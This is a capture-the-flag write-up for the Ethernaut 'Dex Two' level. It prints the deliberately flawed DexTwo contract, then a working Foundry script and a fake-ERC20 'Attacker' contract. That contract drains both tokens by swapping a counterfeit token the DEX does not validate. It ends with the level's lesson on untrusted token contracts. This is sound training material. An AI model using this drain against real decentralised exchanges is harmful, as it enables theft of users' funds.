---
title: "Dex Two"
date: "2024-02-25T10:42:00.000Z"
lastmod: "2024-02-26T16:32:00.000Z"
draft: false
difficulty: "⭐⭐"
prev: "Dex-2e8b616a5bd64b05874e71b8b4a30ac7"
weight: 24
state: "Terminé"
level-url: "https://ethernaut.openzeppelin.com/level/23"
next: "Puzzle-Wallet-45b8e0a7c4784a4b952672eecda0daa6"
type: "docs"
NOTION_METADATA:
  object: "page"
  id: "f9572c09-0965-41d3-afbe-107d66ac7fd9"
  created_time: "2024-02-25T10:42:00.000Z"
  last_edited_time: "2024-02-26T16:32:00.000Z"
  created_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  last_edited_by:
    object: "user"
    id: "7866207c-089f-43df-9333-1dc33859c6a9"
  cover: null
  icon:
    type: "external"
    external:
      url: "https://ethernaut.openzeppelin.com/imgs/BigLevel23.svg"
  parent:
    type: "database_id"
    database_id: "cb6853ff-d731-4d6a-9080-6c8efeec5b1c"
  archived: false
  properties:
    difficulty:
      id: "IAjo"
      type: "select"
      select:
        id: "2fa50c76-9c63-4f19-b03a-b8fb1889da7c"
        name: "⭐⭐"
        color: "blue"
    prev:
      id: "LLP%5C"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Dex-2e8b616a5bd64b05874e71b8b4a30ac7"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Dex-2e8b616a5bd64b05874e71b8b4a30ac7"
          href: null
    date:
      id: "Y%40Gy"
      type: "date"
      date: null
    weight:
      id: "%5Dyda"
      type: "number"
      number: 24
    state:
      id: "f%40ps"
      type: "status"
      status:
        id: "abb7fad3-add1-4b13-946c-06bff36598bf"
        name: "Terminé"
        color: "green"
    level-url:
      id: "juZs"
      type: "url"
      url: "https://ethernaut.openzeppelin.com/level/23"
    next:
      id: "pocA"
      type: "rich_text"
      rich_text:
        - type: "text"
          text:
            content: "Puzzle-Wallet-45b8e0a7c4784a4b952672eecda0daa6"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Puzzle-Wallet-45b8e0a7c4784a4b952672eecda0daa6"
          href: null
    type:
      id: "s%7DKc"
      type: "select"
      select:
        id: "OnJy"
        name: "docs"
        color: "default"
    title:
      id: "title"
      type: "title"
      title:
        - type: "text"
          text:
            content: "Dex Two"
            link: null
          annotations:
            bold: false
            italic: false
            strikethrough: false
            underline: false
            code: false
            color: "default"
          plain_text: "Dex Two"
          href: null
  url: "https://www.notion.so/Dex-Two-f9572c09096541d3afbe107d66ac7fd9"
  public_url: null
UPDATE_TIME: "2024-03-07T09:33:29.225Z"

---
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/katex.min.css" integrity="sha384-bYdxxUwYipFNohQlHt0bjN/LCpueqWz13HufFEV1SUatKs1cm4L6fFgCi1jT643X" crossorigin="anonymous">


This level will ask you to break `DexTwo`, a subtlely modified `Dex` contract from the previous level, in a different way.


You need to drain all balances of token1 and token2 from the `DexTwo` contract to succeed in this level.


You will still start with 10 tokens of `token1` and 10 of `token2`. The DEX contract still starts with 100 of each token.


Things that might help:

- How has the `swap` method been modified?

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "openzeppelin-contracts-08/token/ERC20/IERC20.sol";
import "openzeppelin-contracts-08/token/ERC20/ERC20.sol";
import 'openzeppelin-contracts-08/access/Ownable.sol';

contract DexTwo is Ownable {
  address public token1;
  address public token2;
  constructor() {}

  function setTokens(address _token1, address _token2) public onlyOwner {
    token1 = _token1;
    token2 = _token2;
  }

  function add_liquidity(address token_address, uint amount) public onlyOwner {
    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
  }

  function swap(address from, address to, uint amount) public {
    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
    uint swapAmount = getSwapAmount(from, to, amount);
    IERC20(from).transferFrom(msg.sender, address(this), amount);
    IERC20(to).approve(address(this), swapAmount);
    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
  }

  function getSwapAmount(address from, address to, uint amount) public view returns(uint){
    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
  }

  function approve(address spender, uint amount) public {
    SwappableTokenTwo(token1).approve(msg.sender, spender, amount);
    SwappableTokenTwo(token2).approve(msg.sender, spender, amount);
  }

  function balanceOf(address token, address account) public view returns (uint){
    return IERC20(token).balanceOf(account);
  }
}

contract SwappableTokenTwo is ERC20 {
  address private _dex;
  constructor(address dexInstance, string memory name, string memory symbol, uint initialSupply) ERC20(name, symbol) {
        _mint(msg.sender, initialSupply);
        _dex = dexInstance;
  }

  function approve(address owner, address spender, uint256 amount) public {
    require(owner != _dex, "InvalidApprover");
    super._approve(owner, spender, amount);
  }
}

```


Solution:


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Script.sol";
import "forge-std/console.sol";

import {Attacker,DexTwo,IERC20} from '../src/23.sol';

contract POC is Script {

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        address addr = vm.envAddress("INSTANCE_23");

        vm.startBroadcast(deployerPrivateKey);

        Attacker attacker = new Attacker(addr);

        DexTwo dex2 = DexTwo(addr);
        IERC20 token1 = IERC20(dex2.token1());
        IERC20 token2 = IERC20(dex2.token2());

        console.log('token1 %s', token1.balanceOf(address(dex2)));
        console.log('token2 %s', token2.balanceOf(address(dex2)));

        attacker.attack();

        console.log('token1 %s', token1.balanceOf(address(dex2)));
        console.log('token2 %s', token2.balanceOf(address(dex2)));

        vm.stopBroadcast();

    }
}
```


```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

interface DexTwo {
  function swap(address from, address to, uint amount) external;
  function approve(address spender, uint amount) external;
  function token1() external returns(address);
  function token2() external returns(address);
}

interface IERC20 {
  function balanceOf(address) external returns(uint);
  function transferFrom(
    address from,
    address to,
    uint256 amount
  ) external returns (bool);
}

contract Attacker is IERC20 {
  address public dexTwo;

  constructor(address _dexTwo) {
    dexTwo = _dexTwo;
  }

  function balanceOf(address) public pure returns(uint) {
      return (100);
  }

  function transferFrom(
    address from,
    address to,
    uint256 amount
  ) public virtual returns (bool) {}

  function attack() public {
    DexTwo d = DexTwo(dexTwo);
    d.swap(address(this), d.token1(), 100);
    d.swap(address(this), d.token2(), 100);
  }
}
```


As we've repeatedly seen, interaction between contracts can be a source of unexpected behavior.


Just because a contract claims to implement the [ERC20 spec](https://eips.ethereum.org/EIPS/eip-20) does not mean it's trust worthy.


Some tokens deviate from the ERC20 spec by not returning a boolean value from their `transfer` methods. See [Missing return value bug - At least 130 tokens affected](https://medium.com/coinmonks/missing-return-value-bug-at-least-130-tokens-affected-d67bf08521ca).


Other ERC20 tokens, especially those designed by adversaries could behave more maliciously.


If you design a DEX where anyone could list their own tokens without the permission of a central authority, then the correctness of the DEX could depend on the interaction of the DEX contract and the token contracts being traded.

